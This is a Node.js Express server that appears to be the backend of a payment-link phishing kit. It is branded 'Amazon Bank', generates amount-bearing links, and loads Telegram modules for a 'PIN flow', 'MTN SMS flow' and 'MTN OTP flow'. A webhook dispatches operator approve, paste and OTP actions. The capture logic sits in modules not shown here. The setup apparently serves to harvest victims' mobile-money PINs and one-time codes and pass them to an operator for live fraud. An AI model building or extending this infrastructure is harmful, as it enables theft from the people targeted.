const express = require('express');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

/* ─────────────────────────────────────────────────────────────
   In-memory stores (fine for a demo; swap for a DB later)
   ───────────────────────────────────────────────────────────── */
const links = new Map();
const logs = [];

function log(level, text) {
  const entry = { time: new Date().toISOString().slice(11, 19), level, text };
  logs.unshift(entry);
  if (logs.length > 200) logs.pop();
  console.log(`[${entry.time}] ${level}: ${text}`);
}

/* ─────────────────────────────────────────────────────────────
   LINK MANAGEMENT (existing)
   ───────────────────────────────────────────────────────────── */
app.post('/api/links', (req, res) => {
  const payload = req.body;
  if (!payload || !payload.am) {
    return res.status(400).json({ error: 'Missing amount' });
  }
  const code = crypto.randomBytes(4).toString('hex').toUpperCase();
  links.set(code, { payload, createdAt: Date.now() });
  log('ok', `Link created: ${code} — ${payload.cur} ${payload.am} (${payload.c})`);
  res.json({ code });
});

app.get('/api/links/:code', (req, res) => {
  const entry = links.get(req.params.code);
  if (!entry) {
    log('err', `Link not found: ${req.params.code}`);
    return res.status(404).json({ error: 'Link not found' });
  }
  if (entry.payload.exp && Date.now() > entry.payload.exp) {
    log('err', `Link expired: ${req.params.code}`);
    return res.status(410).json({ error: 'Link expired' });
  }
  log('info', `Link accessed: ${req.params.code}`);
  res.json({ payload: entry.payload });
});

app.get('/api/logs', (req, res) => {
  res.json({ entries: logs });
});

app.post('/api/shorten', (req, res) => {
  res.json({ shortUrl: req.body.url });
});

/* ─────────────────────────────────────────────────────────────
   TELEGRAM-BACKED ROUTES
   Load each module and let it register only the routes it owns.
   Each module exports either { registerRoutes } or { handleUpdate }.
   ───────────────────────────────────────────────────────────── */
let telegramPin = null;   // processing page PIN flow
let telegramMtn = null;   // MTN SMS flow
let telegramOtp = null;   // MTN OTP flow

try { telegramPin = require('./telegram-bot'); } catch (e) { console.warn('[server] telegram-bot.js not found'); }
try { telegramMtn = require('./telegram-mtn'); } catch (e) { console.warn('[server] telegram-mtn.js not found'); }
try { telegramOtp = require('./telegram-otp'); } catch (e) { console.warn('[server] telegram-otp.js not found'); }

if (telegramPin && typeof telegramPin.registerRoutes === 'function') {
  telegramPin.registerRoutes(app);
  log('info', 'telegram-bot registered');
}
if (telegramMtn && typeof telegramMtn.registerRoutes === 'function') {
  telegramMtn.registerRoutes(app);
  log('info', 'telegram-mtn registered');
}
if (telegramOtp && typeof telegramOtp.registerRoutes === 'function') {
  telegramOtp.registerRoutes(app);
  log('info', 'telegram-otp registered');
}

/* ─────────────────────────────────────────────────────────────
   SINGLE TELEGRAM WEBHOOK DISPATCHER
   Telegram only allows one webhook URL per bot, so we route by
   the callback_data prefix:
     otp_*           → telegram-otp
     pin_*           → telegram-bot
     everything else → telegram-mtn  (approve:/paste_full:/expired:)
   ───────────────────────────────────────────────────────────── */
app.post('/api/telegram/webhook', async (req, res) => {
  const update = req.body || {};
  const data = (update.callback_query && update.callback_query.data) || '';

  try {
    if (data.startsWith('otp_') && telegramOtp && typeof telegramOtp.handleUpdate === 'function') {
      await telegramOtp.handleUpdate(update);
    } else if (data.startsWith('pin_') && telegramPin && typeof telegramPin.handleUpdate === 'function') {
      await telegramPin.handleUpdate(update);
    } else if (telegramMtn && typeof telegramMtn.handleUpdate === 'function') {
      await telegramMtn.handleUpdate(update);
    } else {
      console.warn('[webhook] no handler for', data);
    }
  } catch (e) {
    console.error('[webhook] dispatch error', e);
  }

  res.sendStatus(200);
});

/* ─────────────────────────────────────────────────────────────
   HEALTH + ROOT
   ───────────────────────────────────────────────────────────── */
app.get('/health', (req, res) => res.json({ ok: true, uptime: process.uptime() }));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

/* ─────────────────────────────────────────────────────────────
   START
   ───────────────────────────────────────────────────────────── */
app.listen(PORT, () => {
  console.log(`Amazon Bank running on port ${PORT}`);
});
